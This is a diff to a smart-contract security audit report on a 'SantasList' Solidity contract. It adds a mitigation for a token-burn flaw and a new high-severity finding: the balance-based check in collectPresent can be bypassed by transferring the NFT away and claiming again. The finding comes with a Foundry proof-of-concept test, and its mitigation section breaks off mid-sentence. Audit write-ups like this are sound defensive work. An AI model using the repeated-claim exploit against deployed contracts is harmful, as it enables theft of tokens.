@@ -106,5 +106,60 @@ function testAnyoneCanMintNFTUsingOthersTokens()public{
 
 ```
 
-**Recommended Mitigation: **
+**Recommended Mitigation:** This issue can be fixed by burning tokens from the caller and by adding address param in `SantasList::_mintAndIncrement` function
+
+```diff
+unction buyPresent(address presentReceiver) external {
+-        i_santaToken.burn(presentReceiver);
++        i_santaToken.burn(msg.sender);
+-        _mintAndIncrement();
++        _mintAndIncrement(presentReceiver);
+
+    }
+
+-    function _mintAndIncrement() private {
++    function _mintAndIncrement(address presentReceiver) private { 
+-    _safeMint(msg.sender, s_tokenCounter++);
++    _safeMint(presentReceiver, s_tokenCounter++);
+    }
+```
+
+### [H-4] `SantasList::collectPresent` function can be called by `NICE` or `EXTRA_NICE` users multiple times even if they already collected there price once
+
+**Description:** `NICE` or `EXTRA_NICE` can call the `SantasList::collectPresent` to collect there present. In order to prevent users from claiming presents multiple times the below check was implemented.
+
+```solidity
+    if (balanceOf(msg.sender) > 0) {
+            revert SantasList__AlreadyCollected();
+        }
+```
+The issue with the this check is that it checks the number of tokens the user is having and if the user is having more than 0 then the user is considered as one who already collected the present. But what the malicious actor can do is transfer the token to any other address and can come back to claim again and since the check checking how much tokens the malicious user holds, this time the user holds 0 balance so the user will be able to claim the NFT again and again.
+
+**Impact:** This can have a high impact, as it allows any `NICE` user to mint as much NFTs as wanted, and it also allows any `EXTRA_NICE` user to mint as much NFTs and SantaTokens as desired.
+
+**Proof Of Concept:**
+
+```solidity
+
+function testNICEorEXTRA_NICECanClaimPresentMultipleTimes() public{
+        vm.startPrank(santa);
+        santasList.checkList(maliciousActor, SantasList.Status.EXTRA_NICE);
+        santasList.checkTwice(maliciousActor, SantasList.Status.EXTRA_NICE);
+        vm.stopPrank();
+        
+        //Collecting the Present
+        vm.startPrank(maliciousActor);
+        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);
+        santasList.collectPresent();
+        
+        santasList.safeTransferFrom(maliciousActor,user,0);
+        //Collecting the present again
+        santasList.collectPresent();
+        vm.stopPrank();
+
+    }
+```
+
+**Recomended Mitigation:** Add the below check to 
+
 
